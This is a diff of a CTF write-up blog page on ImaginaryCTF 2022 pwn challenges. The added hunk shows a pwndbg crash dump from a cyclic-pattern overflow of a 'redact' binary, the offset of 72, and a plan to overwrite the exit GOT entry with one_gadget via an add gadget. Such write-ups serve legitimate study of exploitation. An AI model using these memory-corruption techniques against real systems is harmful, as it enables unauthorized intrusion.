@@ -14,7 +14,7 @@
 <meta property="og:description" content="CTF : https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1670Github : https:&#x2F;&#x2F;github.com&#x2F;4n0nym4u5&#x2F;CTF-Writeups&#x2F;tree&#x2F;main&#x2F;ImaginaryCTF-22    I solved gatekeep, bot, rickroll, rut-roh-relro, redact and finally stuff during th">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2023-02-12T10:51:00.000Z">
-<meta property="article:modified_time" content="2023-02-23T17:32:32.122Z">
+<meta property="article:modified_time" content="2023-02-25T10:15:06.469Z">
 <meta property="article:author" content="4n0nym4u5">
 <meta property="article:tag" content="rop">
 <meta property="article:tag" content="fmt">
@@ -131,7 +131,7 @@
       
         <time datetime="2023-02-12T10:51:00.000Z" itemprop="datePublished">2023-02-12</time>
         
-        (Updated: <time datetime="2023-02-23T17:32:32.122Z" itemprop="dateModified">2023-02-23</time>)
+        (Updated: <time datetime="2023-02-25T10:15:06.469Z" itemprop="dateModified">2023-02-25</time>)
         
       
     </div>
@@ -416,7 +416,69 @@ Extended information for virtual address <span style="color:#F694FF">0x7ffff7ffd
 <span style="color:#444444">  30</span>   <span style="color:#444444">│</span> <span style="color:#F8F8F2">}</span>
 </pre>
 
-<p>In the source code at line number 28, we can see that the program uses std::copy which is dangerous. The std::copy() algorithm provides no inherent bounds checking and can lead to a buffer overflow. We can also see that <span style="color:#FF6767">Canary is disabled</span> in binary. So simple buffer overflow. I’m using this gadget for solving the challenge. I created a writeup on <a href="https://4n0nym4u5.github.io/2022/01/14/CArot/">CArot</a> challenge from ACSC 2021 which used the same add_gadget trick. Check that writeup if you want to know more on how to use this gadget… </p>
+<p>In the source code at line number 28, we can see that the program uses std::copy which is dangerous. The std::copy() algorithm provides no inherent bounds checking and can lead to a buffer overflow. We can also see that <span style="color:#FF6767">Canary is disabled</span> in binary. </p>
+<pre>Enter some text: aaaaaaaa
+Enter a placeholder: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaac
+Enter the index of the stuff to redact: 0
+aaaaaaaa
+
+Program received signal SIGSEGV, Segmentation fault.
+<span style="color:#82E2FF">0x000000000040149a</span> in <span style="color:#FFCA85">main</span> ()
+LEGEND: <span style="color:#FFCA85">STACK</span> | <span style="color:#82E2FF">HEAP</span> | <span style="color:#FF6767">CODE</span> | <span style="color:#F694FF">DATA</span> | <u style="text-decoration-style:single">RWX</u> | RODATA
+<span style="color:#82E2FF">────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────</span>
+ <b>RAX </b> 0x0
+<span style="color:#FF6767">*</span><span style="color:#FF6767"><b>RBX </b></span> 0x6161616161616166 (&apos;faaaaaaa&apos;)
+<span style="color:#FF6767">*</span><span style="color:#FF6767"><b>RCX </b></span> 0x3b
+<span style="color:#FF6767">*</span><span style="color:#FF6767"><b>RDX </b></span> 0x417
+<span style="color:#FF6767">*</span><span style="color:#FF6767"><b>RDI </b></span> <span style="color:#FFCA85">0x7fffffffdf70</span> ◂— 0x6161616161616161 (&apos;aaaaaaaa&apos;)
+<span style="color:#FF6767">*</span><span style="color:#FF6767"><b>RSI </b></span> <span style="color:#82E2FF">0x405010</span> ◂— 0x1000000010000
+<span style="color:#FF6767">*</span><span style="color:#FF6767"><b>R8  </b></span> <span style="color:#82E2FF">0x417ad0</span> ◂— 0x417
+<span style="color:#FF6767">*</span><span style="color:#FF6767"><b>R9  </b></span> <span style="color:#F694FF">0x4041f0 (std::cin@GLIBCXX_3.4+16)</span> —▸ 0x7ffff7e2e878 —▸ <span style="color:#FF6767">0x7ffff7d1ea90</span> ◂— <span style="color:#AFD700">endbr64</span><span style="color:#EDECEE"> </span>
+<span style="color:#FF6767">*</span><span style="color:#FF6767"><b>R10 </b></span> 0x7ffff7c26c58 ◂— 0xb0022000375d3
+<span style="color:#FF6767">*</span><span style="color:#FF6767"><b>R11 </b></span> 0x33ca847bd4964ced
+<span style="color:#FF6767">*</span><span style="color:#FF6767"><b>R12 </b></span> 0x6161616161616167 (&apos;gaaaaaaa&apos;)
+<span style="color:#FF6767">*</span><span style="color:#FF6767"><b>R13 </b></span> 0x6161616161616168 (&apos;haaaaaaa&apos;)
+ <b>R14 </b> 0x0
+<span style="color:#FF6767">*</span><span style="color:#FF6767"><b>R15 </b></span> <span style="color:#F694FF">0x7ffff7ffd000 (_rtld_global)</span> —▸ <span style="color:#F694FF">0x7ffff7ffe2c0</span> ◂— 0x0
+<span style="color:#FF6767">*</span><span style="color:#FF6767"><b>RBP </b></span> 0x6161616161616169 (&apos;iaaaaaaa&apos;)
+<span style="color:#FF6767">*</span><span style="color:#FF6767"><b>RSP </b></span> <span style="color:#FFCA85">0x7fffffffdfb8</span> ◂— 0x616161616161616a (&apos;jaaaaaaa&apos;)
+<span style="color:#FF6767">*</span><span style="color:#FF6767"><b>RIP </b></span> <span style="color:#FF6767">0x40149a (main+664)</span> ◂— <span style="color:#AFD700">ret</span><span style="color:#EDECEE"> </span>
+<span style="color:#82E2FF">─────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────</span>
+<span style="color:#61FFCA"><b> ►</b></span> <span style="color:#61FFCA"><b>0x40149a</b></span> <span style="color:#61FFCA"><b>&lt;main+664&gt; </b></span>   <span style="color:#AFD700"><b>ret</b></span><span style="color:#EDECEE"><b>    </b></span>&lt;0x616161616161616a&gt;
+
+
+
+
+
+
+
+
+
+
+<span style="color:#82E2FF">──────────────────────────────────────────[ STACK ]───────────────────────────────────────────</span>
+00:0000│ <b>rsp</b> <span style="color:#FFCA85">0x7fffffffdfb8</span> ◂— 0x616161616161616a (&apos;jaaaaaaa&apos;)
+01:0008│ <b>   </b> <span style="color:#FFCA85">0x7fffffffdfc0</span> ◂— 0x616161616161616b (&apos;kaaaaaaa&apos;)
+02:0010│ <b>   </b> <span style="color:#FFCA85">0x7fffffffdfc8</span> ◂— 0x616161616161616c (&apos;laaaaaaa&apos;)
+03:0018│ <b>   </b> <span style="color:#FFCA85">0x7fffffffdfd0</span> ◂— 0x616161616161616d (&apos;maaaaaaa&apos;)
+04:0020│ <b>   </b> <span style="color:#FFCA85">0x7fffffffdfd8</span> ◂— 0x616161616161616e (&apos;naaaaaaa&apos;)
+05:0028│ <b>   </b> <span style="color:#FFCA85">0x7fffffffdfe0</span> ◂— 0x616161616161616f (&apos;oaaaaaaa&apos;)
+06:0030│ <b>   </b> <span style="color:#FFCA85">0x7fffffffdfe8</span> ◂— 0x6161616161616170 (&apos;paaaaaaa&apos;)
+07:0038│ <b>   </b> <span style="color:#FFCA85">0x7fffffffdff0</span> ◂— 0x6161616161616171 (&apos;qaaaaaaa&apos;)
+<span style="color:#82E2FF">────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────</span>
+ ► f 0         0x40149a main+664
+   f 1 0x616161616161616a
+   f 2 0x616161616161616b
+   f 3 0x616161616161616c
+   f 4 0x616161616161616d
+   f 5 0x616161616161616e
+   f 6 0x616161616161616f
+   f 7 0x6161616161616170
+<span style="color:#82E2FF">──────────────────────────────────────────────────────────────────────────────────────────────</span>
+<span style="color:#FF6767"><b>pwndbg&gt; </b></span>
+</pre>
+
+<p>If we provide a long enough cyclic pattern for placeholder and provide index as 0. We can see that the binary segfaults and the offset it segfaults is 72.</p>
+<p>So simple buffer overflow. I’m using the add gadget for modifying the <code>exit</code> GOT to <code>one_gadget</code> and solve the challenge. I created a writeup on <a href="https://4n0nym4u5.github.io/2022/01/14/CArot/">CArot</a> challenge from ACSC 2021 which used the same add_gadget trick. Check that writeup if you want to know more on how to use this gadget… </p>
 <pre><span style="color:#61FFCA">0x000000004011e8</span><span style="color:#F694FF">:</span> <span style="color:#61FFCA">add</span><span style="color:#EDECEE"> </span><span style="color:#F694FF">[</span><span style="color:#FFCA85">rbp</span><span style="color:#EDECEE">-0x3d</span><span style="color:#F694FF">],</span><span style="color:#EDECEE"> </span><span style="color:#FFCA85">ebx</span><span style="color:#F694FF">; </span><span style="color:#61FFCA">nop</span><span style="color:#EDECEE"> </span><span style="color:#F694FF">[</span><span style="color:#FFCA85">rax</span><span style="color:#EDECEE">+</span><span style="color:#FFCA85">rax</span><span style="color:#F694FF">]; </span><span style="color:#61FFCA">ret</span><span style="color:#F694FF">;</span>
 </pre>
 
@@ -566,7 +628,7 @@ TARGET <span style="color:#FF6767">0</span> - <span style="color:#F694FF">&apos;
 </pre>
 <p>But it wasn’t much useful. Then i used the same approach i used in my challenge <a target="_blank" rel="noopener" href="https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/pwn/gets/solution">gets</a>. I created this challenge for Sekai CTF 2022. </p>
 <h3 id="Exploit-4"><a href="#Exploit-4" class="headerlink" title="Exploit"></a>Exploit</h3><p>If you see the disassembly of <code>fread</code> on this part</p>
-<pre>   <span style="color:#82E2FF">0x00007ffff7a9aa9d</span> &lt;+205&gt;: <span style="color:#61FFCA">add</span><span style="color:#EDECEE">    </span><span style="color:#FF6767">rsp</span>,<span style="color:#82E2FF">0x8</span>
+<pre>   <span style="color:#82E2FF">0x00007ffff7a9aa9d</span> &lt;+205&gt;: <span style="color:#61FFCA"> add</span><span style="color:#EDECEE">    </span><span style="color:#FF6767">rsp</span>,<span style="color:#82E2FF">0x8</span>
    <span style="color:#82E2FF">0x00007ffff7a9aaa1</span> &lt;+209&gt;:  <span style="color:#61FFCA">mov</span><span style="color:#EDECEE">    </span><span style="color:#FF6767">rax</span>,<span style="color:#FF6767">rbx</span>
    <span style="color:#82E2FF">0x00007ffff7a9aaa4</span> &lt;+212&gt;:  <span style="color:#61FFCA">pop</span><span style="color:#EDECEE">    </span><span style="color:#FF6767">rbx</span>
    <span style="color:#82E2FF">0x00007ffff7a9aaa5</span> &lt;+213&gt;:  <span style="color:#61FFCA">pop</span><span style="color:#EDECEE">    </span><span style="color:#FF6767">rbp</span>
